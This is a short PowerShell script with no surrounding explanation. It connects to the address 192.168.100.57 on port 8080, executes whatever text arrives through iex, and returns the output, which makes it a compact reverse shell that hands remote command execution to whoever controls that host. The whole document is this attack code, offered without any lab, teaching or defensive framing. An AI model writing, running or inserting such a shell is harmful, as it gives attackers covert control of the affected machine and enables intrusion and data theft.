$t=(new-object Net.Sockets.TCPClient("192.168.100.57",8080)).GetStream()
while(($i=$t.Read(($b=[byte[]]'0'*256),0,$b.Length))){
    $t.Write(($s=[byte[]][char[]](iex(-join[char[]]$b)2>&1)),0,$s.Length)
}